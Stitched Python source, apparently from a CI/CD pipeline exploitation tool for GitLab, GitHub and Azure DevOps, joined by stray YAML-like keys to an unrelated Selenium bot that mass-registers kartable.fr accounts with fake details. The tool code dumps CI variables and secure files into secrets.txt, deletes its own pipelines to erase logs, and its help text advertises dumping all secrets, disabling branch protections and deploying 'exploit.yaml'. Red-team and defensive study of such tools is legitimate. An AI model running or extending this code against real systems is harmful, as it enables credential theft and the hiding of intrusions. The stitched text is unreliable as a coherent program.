    def checkToken(cls, token, gitlabURL, verifyCert):
        logger.verbose(f"Checking token: {token}")
        # from https://docs.gitlab.com/ee/api/rest/index.html#personalprojectgroup-access-tokens
        try:
            cookies = {}
            headers = {"User-Agent": USER_AGENT}

            if isGitLabSessionCookie(token):
                cookies["_gitlab_session"] = token
            else:
                headers["PRIVATE-TOKEN"] = token

            return (
                requests.get(
                    f"{gitlabURL.strip('/')}/api/v4/user",
                    headers=headers,
                    cookies=cookies,
                    verify=verifyCert,
                ).status_code
                == 200
            )
        except Exception as e:
            logger.error(e)
        return False

    def __getLogin(self):
        response = self.getUser()
        return response.get("username", "")

    def getUser(self):
        logger.debug(f"Retrieving user informations")

        return self._session.get(f"{self._gitlabURL}/api/v4/user").json()

    def setCookiesAndHeaders(self):
        if isGitLabSessionCookie(self._token):
            self._session.cookies.update({"_gitlab_session": self._token})
        else:
            self._session.headers.update({"PRIVATE-TOKEN": self._token})

    def __paginatedGet(self, url, params={}):

        params["per_page"] = 100

        res = []

        i = 1
        while True:

            params["page"] = i

            response = self._session.get(url, params=params)

            if response.status_code == 200:
                if len(response.json()) == 0:
                    break
                res.extend(response.json())
                i += 1

            else:
                logger.debug(f"Error {response.status_code} while retrieving data: {url}")
                return response.status_code, response.json()

        return response.status_code, res

    def listVariablesFromProject(self, project):
        id = project.get("id")
        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects/{id}/variables")

        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir(project.get("path_with_namespace"))

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                secret = {"key": variable["key"], "value": variable["value"], "protected": variable["protected"]}

                if variable["hidden"] != None:
                    secret["hidden"] = variable["hidden"]
                else:
                    secret["hidden"] = "N/A"

                res.append(secret)

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listInheritedVariablesFromProject(self, project):
        id = project.get("id")
        res = []

        graphQL = {
            "operationName": "getInheritedCiVariables",
            "variables": {"first": 100, "fullPath": project.get("path_with_namespace")},
            "query": """
                query getInheritedCiVariables($after: String, $first: Int, $fullPath: ID!) {
                    project(fullPath: $fullPath) {
                        inheritedCiVariables(after: $after, first: $first) {
                            nodes {
                                key
                                groupName
                                masked
                                hidden
                                protected
                                raw
                            }
                        }
                    }
                }
            """,
        }

        response = self._session.post(f"{self._gitlabURL}/api/graphql", json=graphQL)

        if response.status_code == 200 and len(response.text) > 0:
            path = self.__createOutputDir(project.get("path_with_namespace"))

            f = open(f"{path}/secrets.txt", "w")

            nodes = response.json().get("data", {}).get("project", {}).get("inheritedCiVariables", {}).get("nodes", [])
            for variable in nodes:

                secret = {
                    "key": variable["key"],
                    "value": variable["raw"],
                    "group": variable["groupName"],
                    "protected": variable["protected"],
                }

                if variable["hidden"] != None:
                    secret["hidden"] = variable["hidden"]
                else:
                    secret["hidden"] = "N/A"

                res.append(secret)

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()

        elif response.status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listSecureFilesFromProject(self, project):
        logger.debug("Getting project secure files")
        id = project.get("id")

        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects/{id}/secure_files")
        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir(project.get("path_with_namespace"))
            date = time.strftime("%Y-%m-%d_%H-%M-%S")

            for secFile in response:

                date = time.strftime("%Y-%m-%d_%H-%M-%S")
                name = "".join(
                    [c for c in secFile.get("name") if c.isalpha() or c.isdigit() or c in (" ", ".", "-", "_")]
                ).strip()
                fileName = f"securefile_{date}_{name}"

                f = open(f"{path}/{fileName}", "wb")

                content = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{id}/secure_files/{secFile.get('id')}/download"
                )

                # handle large files
                for chunk in content.iter_content(chunk_size=8192):
                    f.write(chunk)
                f.close()

                res.append({"name": secFile.get("name"), "path": f"{path}/{fileName}"})

        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listVariablesFromGroup(self, group):
        id = group.get("id")
        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/groups/{id}/variables")

        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir(group.get("full_path"))

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                secret = {"key": variable["key"], "value": variable["value"], "protected": variable["protected"]}

                if variable["hidden"] != None:
                    secret["hidden"] = variable["hidden"]
                else:
                    secret["hidden"] = "N/A"

                res.append(secret)

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listVariablesFromInstance(self):
        res = []
        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/admin/ci/variables")

        if status_code == 200 and len(response) > 0:

            path = self.__createOutputDir("")

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                secret = {"key": variable["key"], "value": variable["value"], "protected": variable["protected"]}

                if variable["hidden"] != None:
                    secret["hidden"] = variable["hidden"]
                else:
                    secret["hidden"] = "N/A"

                res.append(secret)

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def addProject(self, project=None, filterWrite=False, strict=False, membership=False):
        logger.debug(f"Checking project: {project}")

        params = {}

        if membership:
            params["membership"] = True

        if project != None:
            params["search_namespaces"] = True
            params["search"] = project

        if filterWrite:
            params["min_access_level"] = 30

        if not (project and project.isnumeric()):
            status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects", params)
        else:
            response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{project}")
            status_code = response.status_code
            response = [response.json()]

        if status_code == 200:
            if len(response) == 0:
                return

            for p in response:
                if strict and p.get("path_with_namespace") != project:
                    continue
                p = {
                    "id": p.get("id"),
                    "path_with_namespace": p.get("path_with_namespace"),
                    "name": p.get("name"),
                    "path": p.get("path"),
                }
                self._projects.append(p)

        else:
            logger.error("Error while retrieving projects")
            logger.debug(response)

    def addGroups(self, group=None):
        logger.debug(f"Checking group: {group}")

        params = {"all_available": True}

        if group != None:
            params["search_namespaces"] = True
            params["search"] = group

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/groups", params)

        if status_code == 200:
            if len(response) == 0:
                return

            for p in response:
                p = {
                    "id": p.get("id"),
                    "full_path": p.get("full_path"),
                    "name": p.get("name"),
                }
                self._groups.append(p)

        else:
            logger.error("Error while retrieving groups")
            logger.debug(response)

    def listUsers(self):
        logger.debug(f"Listing users.")
        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/users")

        if status_code == 200:
            if len(response) == 0:
                return

            for p in response:
                u = {
                    "id": p.get("id"),
                    "username": p.get("username"),
                    "email": p.get("email"),
                    "is_admin": p.get("is_admin"),
                }
                res.append(u)

        else:
            logger.error("Error while retrieving groups")
            logger.debug(response)
        return res

    def __createOutputDir(self, name):
        # outputName = name.replace("/", "_")
        path = f"{self._outputDir}/{name}"
        makedirs(path, exist_ok=True)
        return path

    def waitPipeline(self, projectId):
        logger.info("Getting pipeline output")

        time.sleep(5)

        response = self._session.get(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}"
        ).json()

        if response[0].get("status") not in COMPLETED_STATES:
            for i in range(self._maxRetry):
                logger.warning(f"Pipeline still running, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)

                response = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}"
                ).json()

                if response[0].get("status") in COMPLETED_STATES:
                    break
                if i == (self._maxRetry - 1):
                    logger.error("Error: pipeline still not finished.")

        return (
            response[0].get("id"),
            response[0].get("status"),
        )

    def __getJobs(self, projectId, pipelineId):

        status_code, response = self.__paginatedGet(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines/{pipelineId}/jobs"
        )

        if status_code == 403:
            raise GitLabError(response.get("message"))

        # reverse the list to get the first job at the first position
        return response[::-1]

    def downloadPipelineOutput(self, project, pipelineId):
        projectPath = project.get("path_with_namespace")
        self.__createOutputDir(projectPath)

        projectId = project.get("id")

        jobs = self.__getJobs(projectId, pipelineId)

        date = time.strftime("%Y-%m-%d_%H-%M-%S")
        f = open(f"{self._outputDir}/{projectPath}/pipeline_{date}.log", "w")

        if len(jobs) == 0:
            return None

        for job in jobs:

            jobId = job.get("id")
            jobName = job.get("name", "")
            jobStage = job.get("stage", "")
            jobStatus = job.get("status", "")

            output = self.__getTraceForJobId(projectId, jobId)

            if jobStatus != "skipped":
                f.write(f"[+] {jobName} (stage={jobStage})\n")
                f.write(output)

        f.close()

        return f"pipeline_{date}.log"

    def __getTraceForJobId(self, projectId, jobId):

        response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/jobs/{jobId}/trace")

        if response.status_code != 200:
            for i in range(self._maxRetry):
                logger.warning(f"Output not ready, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)
                response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/jobs/{jobId}/trace")
                if response.status_code == 200:
                    break
                if i == (self._maxRetry - 1):
                    logger.error("Output still no ready, error !")
                    return None

        return response.text

    def __deletePipeline(self, projectId):
        logger.debug("Deleting pipeline")

        status_code, response = self.__paginatedGet(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}"
        )

        headers = {}

        # Get CSRF token when using session cookie otherwise we can't delete a pipeline
        if isGitLabSessionCookie(self._token):

            html_content = self._session.get(f"{self._gitlabURL}/").text
            pattern = r'<meta name="csrf-token" content="([^"]+)"'
            match = re.search(pattern, html_content)
            csrf_token = match.group(1)

            headers["x-csrf-token"] = csrf_token

        for pipeline in response:

            # additional checks for non default branches
            # we don't want to remove legitimate logs
            if self._branchName != self._DEFAULT_BRANCH_NAME:
                commitId = pipeline.get("sha")

                response = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{projectId}/repository/commits/{commitId}"
                ).json()

                if response.get("title") not in [Git.ATTACK_COMMIT_MSG, Git.CLEAN_COMMIT_MSG]:
                    continue

                if response.get("author_name") != Git.USER:
                    continue

            pipelineId = pipeline.get("id")
            graphQL = {
                "operationName": "deletePipeline",
                "variables": {"id": f"gid://gitlab/Ci::Pipeline/{pipelineId}"},
                "query": "mutation deletePipeline($id: CiPipelineID!) {\n  pipelineDestroy(input: {id: $id}) {\n    errors\n    __typename\n  }\n}\n",
            }

            response = self._session.post(f"{self._gitlabURL}/api/graphql", json=graphQL, headers=headers)

    def cleanAllLogs(self, projectId):
        # deleting the pipeline removes everything
        self.__deletePipeline(projectId)

    # not working
    def __cleanEvents(self, projectId):
        logger.debug(f"Deleting events for project: {projectId}")

        i = 1
        while True:

            params = {"per_page": 100, "page": i}

            response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/events", params=params)

            if response.status_code == 200:
                if len(response.json()) == 0:
                    break

                for event in response.json():
                    eventId = event.get("id")
                    # don't work
                    response = self._session.delete(f"{self._gitlabURL}/api/v4/projects/{projectId}/events/{eventId}")

                i += 1
            else:
                logger.error("Error while retrieving event")
                logger.debug(response.json())

    def getBranchesProtectionRules(self, projectId):
        logger.debug("Getting branch protection rules")

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects/{projectId}/protected_branches")

        if status_code == 403:
            raise GitLabError(response.get("message"))

        return response

    def getBranches(self, projectId):
        logger.debug("Getting branch protection rules (limited)")

        status_code, response = self.__paginatedGet(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/repository/branches"
        )

        if status_code == 403:
            raise GitLabError(response.get("message"))

        # sometimes GitLab return a 404 and not an empty array
        if status_code == 404:
            project = self.getProject(projectId)

            # if the repo is empty raise an error since there is no branch
            if project.get("empty_repo"):
                raise GitLabError("The project is empty and has no branches.")
            else:
                raise GitLabError("Got 404 for unknown reason.")

        return response

    def getProject(self, projectId):
        logger.debug("Getting project: {projectId}")

        response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}")

        if response.status_code != 200:
            raise GitLabError(response.json().get("message"))
        else:
            return response.json()

    def getFailureReasonPipeline(self, projectId, pipelineId):

        response = self._session.get(f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines/{pipelineId}").json()

        return response.get("yaml_errors", None)

    def getFailureReasonJobs(self, projectId, pipelineId):

        res = []
        jobs = self.__getJobs(projectId, pipelineId)

        for job in jobs:

            failure = {}
            failure["name"] = job.get("name", "")
            failure["stage"] = job.get("stage", "")
            failure["failure_reason"] = job.get("failure_reason", "")

            if failure["failure_reason"] != "":
                res.append(failure)

        return res 

permissions: """
CICD pipeline exploitation tool

Usage:
    nord-stream.py devops [options] --token <pat> --org <org> [extraction] [--project <project> --write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name>]
    nord-stream.py devops [options] --token <pat> --org <org> --yaml <yaml> --project <project> [--write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name>]
    nord-stream.py devops [options] --token <pat> --org <org> --build-yaml <output> [--build-type <type>]
    nord-stream.py devops [options] --token <pat> --org <org> --clean-logs [--project <project>]
    nord-stream.py devops [options] --token <pat> --org <org> --list-projects [--write-filter]
    nord-stream.py devops [options] --token <pat> --org <org> (--list-secrets [--project <project> --write-filter] | --list-users)
    nord-stream.py devops [options] --token <pat> --org <org> --describe-token

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    -d, --debug                             Debug mode
    --output-dir <dir>                      Output directory for logs
    --ignore-cert                           Allow insecure server connections

Commit:
    --user <user>                           User used to commit
    --email <email>                         Email address used commit
    --key-id <id>                           GPG primary key ID to sign commits

args:
    --token <pat>                           Azure DevOps personal token or JWT
    --org <org>                             Org name
    -p, --project <project>                 Run on selected project (can be a file)
    -y, --yaml <yaml>                       Run arbitrary job
    --clean-logs                            Delete all pipeline created by this tool. This operation is done by default but can be manually triggered.
    --no-clean                              Don't clean pipeline logs (default false)
    --list-projects                         List all projects.
    --list-secrets                          List all secrets.
    --list-users                            List all users.
    --write-filter                          Filter projects where current user has write or admin access.
    --build-yaml <output>                   Create a pipeline yaml file with default configuration.
    --build-type <type>                     Type used to generate the yaml file can be: default, azurerm, github, aws, sonar, ssh
    --describe-token                        Display information on the token
    --branch-name <name>                    Use specific branch name for deployment.
    --pipeline-name <name>                  Use pipeline for deployment.
    --repo-name <name>                      Use specific repo for deployment.

Exctraction:
    --extract <list>                        Extract following secrets [vg,sf,gh,az,aws,sonar,ssh]
    --no-extract <list>                     Don't extract following secrets [vg,sf,gh,az,aws,sonar,ssh]

Examples:
    List all secrets from all projects
    $ nord-stream.py devops --token "$PAT" --org myorg --list-secrets

    Dump all secrets from all projects
    $ nord-stream.py devops --token "$PAT" --org myorg

Authors: @hugow @0hexit
"""

from docopt import docopt
from nordstream.cicd.devops import DevOps
from nordstream.core.devops.devops import DevOpsRunner
from nordstream.utils.log import logger, NordStreamLog
from nordstream.git import Git


def start(argv):
    args = docopt(__doc__, argv=argv)

    if args["--verbose"]:
        NordStreamLog.setVerbosity(verbose=1)

    if args["--debug"]:
        NordStreamLog.setVerbosity(verbose=2)

    logger.debug(args)
    # check validity of the token
    if not DevOps.checkToken(args["--token"], args["--org"], (not args["--ignore-cert"])):
        logger.critical("Invalid token or org.")

    # devops setup
    devops = DevOps(args["--token"], args["--org"], (not args["--ignore-cert"]))
    if args["--output-dir"]:
        devops.outputDir = args["--output-dir"] + "/"
    if args["--branch-name"]:
        devops.branchName = args["--branch-name"]
    if args["--pipeline-name"]:
        devops.pipelineName = args["--pipeline-name"]
    if args["--repo-name"]:
        devops.repoName = args["--repo-name"]

    devopsRunner = DevOpsRunner(devops)

    if args["--key-id"]:
        Git.KEY_ID = args["--key-id"]
    if args["--user"]:
        Git.USER = args["--user"]
    if args["--email"]:
        Git.EMAIL = args["--email"]

    if args["--yaml"]:
        devopsRunner.yaml = args["--yaml"]
    if args["--write-filter"]:
        devopsRunner.writeAccessFilter = args["--write-filter"]

    if args["--extract"] and args["--no-extract"]:
        logger.critical("Can't use both --service-connection and --no-service-connection option.")

    if args["--extract"]:
        devopsRunner.parseExtractList(args["--extract"])

    if args["--no-extract"]:
        devopsRunner.parseExtractList(args["--no-extract"], False)

    if args["--no-clean"]:
        devopsRunner.cleanLogs = not args["--no-clean"]

    if args["--describe-token"]:
        devopsRunner.describeToken()
        return

    devopsRunner.getProjects(args["--project"])

    # logic
    if args["--list-projects"]:
        devopsRunner.listDevOpsProjects()

    elif args["--list-users"]:
        devopsRunner.listDevOpsUsers()

    elif args["--list-secrets"]:
        devopsRunner.listProjectSecrets()

    elif args["--clean-logs"]:
        devopsRunner.manualCleanLogs()

    elif args["--build-yaml"]:
        devopsRunner.output = args["--build-yaml"]
        devopsRunner.createYaml(args["--build-type"])

    else:
        devopsRunner.runPipeline() 
  contents: """
CICD pipeline exploitation tool

Usage:
    nord-stream.py github [options] --token <ghp> --org <org> [--repo <repo> --no-repo --no-env --no-org --env <env> --disable-protections --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> --yaml <yaml> --repo <repo> [--env <env> --disable-protections --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> ([--clean-logs] [--clean-branch-policy]) [--repo <repo> --branch-name <name>]
    nord-stream.py github [options] --token <ghp> --org <org> --build-yaml <filename> --repo <repo> [--build-type <type> --env <env>]
    nord-stream.py github [options] --token <ghp> --org <org> --azure-tenant-id <tenant> --azure-client-id <client> [--repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> --aws-role <role> --aws-region <region> [--repo <repo> --env <env> --disable-protections --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> --list-protections [--repo <repo> --branch-name <name> --disable-protections]
    nord-stream.py github [options] --token <ghp> --org <org> --list-secrets [--repo <repo> --no-repo --no-env --no-org]
    nord-stream.py github [options] --token <ghp> [--org <org>] --list-repos [--write-filter]
    nord-stream.py github [options] --token <ghp> --describe-token

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    -d, --debug                             Debug mode
    --output-dir <dir>                      Output directory for logs

Commit:
    --user <user>                           User used to commit
    --email <email>                         Email address used commit
    --key-id <id>                           GPG primary key ID to sign commits

args:
    --token <ghp>                           Github personal token
    --org <org>                             Org name
    -r, --repo <repo>                       Run on selected repo (can be a file)
    -y, --yaml <yaml>                       Run arbitrary job
    --clean-logs                            Delete all logs created by this tool. This operation is done by default but can be manually triggered.
    --no-clean                              Don't clean workflow logs (default false)
    --clean-branch-policy                   Remove branch policy, can be used with --repo. This operation is done by default but can be manually triggered.
    --build-yaml <filename>                 Create a pipeline yaml file with all secrets.
    --build-type <type>                     Type used to generate the yaml file can be: default, azureoidc, awsoidc
    --env <env>                             Specify env for the yaml file creation.
    --no-repo                               Don't extract repo secrets.
    --no-env                                Don't extract environnments secrets.
    --no-org                                Don't extract organization secrets.
    --azure-tenant-id <tenant>              Identifier of the Azure tenant associated with the application having federated credentials (OIDC related).
    --azure-subscription-id <subscription>  Identifier of the Azure subscription associated with the application having federated credentials (OIDC related).
    --azure-client-id <client>              Identifier of the Azure application (client) associated with the application having federated credentials (OIDC related).
    --aws-role <role>                       AWS role to assume (OIDC related).
    --aws-region <region>                   AWS region (OIDC related).
    --list-protections                      List all protections.
    --list-repos                            List all repos.
    --list-secrets                          List all secrets.
    --disable-protections                   Disable the branch protection rules (needs admin rights)
    --write-filter                          Filter repo where current user has write or admin access.
    --force                                 Don't check environment and branch protections.
    --branch-name <name>                    Use specific branch name for deployment.
    --describe-token                        Display information on the token

Examples:
    List all secrets from all repositories
    $ nord-stream.py github --token "$GHP" --org myorg --list-secrets

    Dump all secrets from all repositories and try to disable branch protections
    $ nord-stream.py github --token "$GHP" --org myorg --disable-protections

Authors: @hugow @0hexit
"""

from docopt import docopt
from nordstream.cicd.github import GitHub
from nordstream.core.github.github import GitHubWorkflowRunner
from nordstream.utils.log import logger, NordStreamLog
from nordstream.git import Git


def start(argv):
    args = docopt(__doc__, argv=argv)

    if args["--verbose"]:
        NordStreamLog.setVerbosity(verbose=1)
    if args["--debug"]:
        NordStreamLog.setVerbosity(verbose=2)

    logger.debug(args)

    # check validity of the token
    if not GitHub.checkToken(args["--token"]):
        logger.critical("Invalid token.")

    # github setup
    gitHub = GitHub(args["--token"])
    if args["--output-dir"]:
        gitHub.outputDir = args["--output-dir"] + "/"
    if args["--org"]:
        gitHub.org = args["--org"]
    if args["--branch-name"]:
        gitHub.branchName = args["--branch-name"]
        logger.info(f'Using branch: "{gitHub.branchName}"')

    if args["--key-id"]:
        Git.KEY_ID = args["--key-id"]
    if args["--user"]:
        Git.USER = args["--user"]
    if args["--email"]:
        Git.EMAIL = args["--email"]

    # runner setup
    gitHubWorkflowRunner = GitHubWorkflowRunner(gitHub, args["--env"])

    if args["--no-repo"]:
        gitHubWorkflowRunner.extractRepo = not args["--no-repo"]
    if args["--no-env"]:
        gitHubWorkflowRunner.extractEnv = not args["--no-env"]
    if args["--no-org"]:
        gitHubWorkflowRunner.extractOrg = not args["--no-org"]
    if args["--yaml"]:
        gitHubWorkflowRunner.yaml = args["--yaml"]
    if args["--disable-protections"]:
        gitHubWorkflowRunner.disableProtections = args["--disable-protections"]
    if args["--write-filter"]:
        gitHubWorkflowRunner.writeAccessFilter = args["--write-filter"]
    if args["--force"]:
        gitHubWorkflowRunner.forceDeploy = args["--force"]
    if args["--aws-role"] or args["--azure-tenant-id"]:
        gitHubWorkflowRunner.exploitOIDC = True
    if args["--azure-tenant-id"]:
        gitHubWorkflowRunner.tenantId = args["--azure-tenant-id"]
    if args["--azure-subscription-id"]:
        gitHubWorkflowRunner.subscriptionId = args["--azure-subscription-id"]
    if args["--azure-client-id"]:
        gitHubWorkflowRunner.clientId = args["--azure-client-id"]
    if args["--aws-role"]:
        gitHubWorkflowRunner.role = args["--aws-role"]
    if args["--aws-region"]:
        gitHubWorkflowRunner.region = args["--aws-region"]
    if args["--no-clean"]:
        gitHubWorkflowRunner.cleanLogs = not args["--no-clean"]

    # logic
    if args["--describe-token"]:
        gitHubWorkflowRunner.describeToken()

    elif args["--list-repos"]:
        gitHubWorkflowRunner.getRepos(args["--repo"])
        gitHubWorkflowRunner.listGitHubRepos()

    elif args["--list-secrets"]:
        gitHubWorkflowRunner.getRepos(args["--repo"])
        gitHubWorkflowRunner.listGitHubSecrets()

    elif args["--build-yaml"]:
        gitHubWorkflowRunner.writeAccessFilter = True
        gitHubWorkflowRunner.workflowFilename = args["--build-yaml"]
        gitHubWorkflowRunner.createYaml(args["--repo"], args["--build-type"])

    # Cleaning
    elif args["--clean-logs"] or args["--clean-branch-policy"]:
        gitHubWorkflowRunner.getRepos(args["--repo"])
        if args["--clean-logs"]:
            gitHubWorkflowRunner.manualCleanLogs()
        if args["--clean-branch-policy"]:
            gitHubWorkflowRunner.manualCleanBranchPolicy()

    elif args["--list-protections"]:
        gitHubWorkflowRunner.writeAccessFilter = True
        gitHubWorkflowRunner.getRepos(args["--repo"])
        gitHubWorkflowRunner.checkBranchProtections()

    else:
        gitHubWorkflowRunner.writeAccessFilter = True
        gitHubWorkflowRunner.getRepos(args["--repo"])
        gitHubWorkflowRunner.start() 

jobs: """
CICD pipeline exploitation tool

Usage:
    nord-stream.py gitlab [options] --token <pat> (--list-secrets | --list-protections) [--project <project> --group <group> --no-project --no-group --no-instance --write-filter --sleep <seconds>]
    nord-stream.py gitlab [options] --token <pat> ( --list-groups | --list-projects | --list-users) [--project <project> --group <group> --write-filter]
    nord-stream.py gitlab [options] --token <pat> --yaml <yaml> --project <project> [--project-path <path> --no-clean]
    nord-stream.py gitlab [options] --token <pat> --clean-logs [--project <project>]
    nord-stream.py gitlab [options] --token <pat> --describe-token

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    -d, --debug                             Debug mode
    --output-dir <dir>                      Output directory for logs
    --url <gitlab_url>                      Gitlab URL [default: https://gitlab.com]
    --ignore-cert                           Allow insecure server connections
    --membership                            Limit by projects that the current user is a member of

Commit:
    --user <user>                           User used to commit
    --email <email>                         Email address used commit
    --key-id <id>                           GPG primary key ID to sign commits

args:
    --token <pat>                           GitLab personal access token or _gitlab_session cookie
    --project <project>                     Run on selected project (can be a file / project id)
    --group <group>                         Run on selected group (can be a file)
    --list-secrets                          List all secrets.
    --list-protections                      List branch protection rules.
    --list-projects                         List all projects.
    --list-groups                           List all groups.
    --list-users                            List all users.
    --write-filter                          Filter repo where current user has developer access or more.
    --no-project                            Don't extract project secrets.
    --no-group                              Don't extract group secrets.
    --no-instance                           Don't extract instance secrets.
    -y, --yaml <yaml>                       Run arbitrary job
    --branch-name <name>                    Use specific branch name for deployment.
    --clean-logs                            Delete all pipeline logs created by this tool. This operation is done by default but can be manually triggered.
    --no-clean                              Don't clean pipeline logs (default false)
    --describe-token                        Display information on the token
    --sleep <seconds>                       Time to sleep in seconds between each secret request.
    --project-path <path>                   Local path of the git folder.

Examples:
    Dump all secrets
    $ nord-stream.py gitlab --token "$TOKEN" --url https://gitlab.local --list-secrets

    Deploy the custom pipeline on the master branch
    $ nord-stream.py gitlab --token "$TOKEN" --url https://gitlab.local --yaml exploit.yaml --branch master --project 'group/projectname'

Authors: @hugow @0hexit
"""

from docopt import docopt
from nordstream.cicd.gitlab import GitLab
from nordstream.core.gitlab.gitlab import GitLabRunner
from nordstream.utils.log import logger, NordStreamLog
from nordstream.git import Git


def start(argv):
    args = docopt(__doc__, argv=argv)

    if args["--verbose"]:
        NordStreamLog.setVerbosity(verbose=1)
    if args["--debug"]:
        NordStreamLog.setVerbosity(verbose=2)

    logger.debug(args)

    # check validity of the token
    if not GitLab.checkToken(args["--token"], args["--url"], (not args["--ignore-cert"])):
        logger.critical('Invalid token or the token doesn\'t have the "api" scope.')

    # gitlab setup
    gitlab = GitLab(args["--url"], args["--token"], (not args["--ignore-cert"]))
    if args["--output-dir"]:
        gitlab.outputDir = args["--output-dir"] + "/"
    gitLabRunner = GitLabRunner(gitlab)

    if args["--key-id"]:
        Git.KEY_ID = args["--key-id"]
    if args["--user"]:
        Git.USER = args["--user"]
    if args["--email"]:
        Git.EMAIL = args["--email"]

    if args["--branch-name"]:
        gitlab.branchName = args["--branch-name"]
        logger.info(f'Using branch: "{gitlab.branchName}"')

    # config
    if args["--write-filter"]:
        gitLabRunner.writeAccessFilter = args["--write-filter"]
    if args["--no-project"]:
        gitLabRunner.extractProject = not args["--no-project"]
    if args["--no-group"]:
        gitLabRunner.extractGroup = not args["--no-group"]
    if args["--no-instance"]:
        gitLabRunner.extractInstance = not args["--no-instance"]
    if args["--no-clean"]:
        gitLabRunner.cleanLogs = not args["--no-clean"]
    if args["--yaml"]:
        gitLabRunner.yaml = args["--yaml"]
    if args["--sleep"]:
        gitLabRunner.sleepTime = args["--sleep"]
    if args["--project-path"]:
        gitLabRunner.localPath = args["--project-path"]

    # logic
    if args["--describe-token"]:
        gitLabRunner.describeToken()

    elif args["--list-projects"]:
        gitLabRunner.getProjects(args["--project"], membership=args["--membership"])
        gitLabRunner.listGitLabProjects()

    elif args["--list-protections"]:
        gitLabRunner.getProjects(args["--project"], membership=args["--membership"])
        gitLabRunner.listBranchesProtectionRules()

    elif args["--list-groups"]:
        gitLabRunner.getGroups(args["--group"])
        gitLabRunner.listGitLabGroups()

    elif args["--list-users"]:
        gitLabRunner.listGitLabUsers()

    elif args["--list-secrets"]:
        if gitLabRunner.extractProject:
            gitLabRunner.getProjects(args["--project"], membership=args["--membership"])
        if gitLabRunner.extractGroup:
            gitLabRunner.getGroups(args["--group"])

        gitLabRunner.listGitLabSecrets()

    elif args["--clean-logs"]:
        gitLabRunner.getProjects(args["--project"], membership=args["--membership"])
        gitLabRunner.manualCleanLogs()

    else:
        gitLabRunner.getProjects(args["--project"], strict=True, membership=args["--membership"])
        gitLabRunner.runPipeline() 
  release-build: """
Reuires a webbrowser and the helium module
The hashlib module isn't needed basically as I had to find an easy way to get different a password for each account
BUT, kartable.fr accepts pretty much every fuckin' email, name, password and birthdate without complaining
so you could create an account with a non-existing email

Most of the features are unstable and I'll certainly add a log file to handle errors
"""
import helium
import hashlib
import time
from selenium.webdriver.support.ui import Select

class main:
    def __init__(self, classe, firstname, lastname, email, password, birthdate=None, ecole="victor hugo", url="https://www.kartable.fr/inscription"):
        # birthdate as follows : DD/MM/YYYY
        self.url = url
        self.classe = classe
        self.firstname = firstname
        self.lastname = lastname
        self.email = email
        self.password = password
        self.ecole = ecole
        self.birthdate = birthdate.split("/") if len(str(birthdate).split("/")) == 3 else None
        self.driver = helium.start_chrome(self.url)

    def register(self, sponso=False):
        if sponso == False:
            try:
                helium.click("élève")
                helium.click("élève")
            except LookupError:
                print("élève failed")
        helium.click(self.classe)
        helium.click("s'inscrire avec un e-mail")
        helium.write(self.firstname, into="prénom")
        helium.write(self.lastname, into="nom")
        helium.write(self.email, into="adresse e-mail")
        helium.write(self.password, into="mot de passe")
        # Setting custom birthdate
        self.set_birthdate()
        helium.click("terminer")
        # time.sleep(5)
        try:
            helium.click("plus tard")
        except LookupError:
            pass
        time.sleep(5)

    def log_out(self):
        #!!!!!NOT TESTED YET!!!!!!
        self.driver.get("https://www.kartable.fr/compte")
        helium.click("Se déconnecter")
        helium.click("SE DÉCONNECTER")

    def log_in(self):
        self.driver.get("https://www.kartable.fr/connexion")
        helium.write(self.email, into="adresse e-mail")
        helium.write(self.password, into="mot de passe")
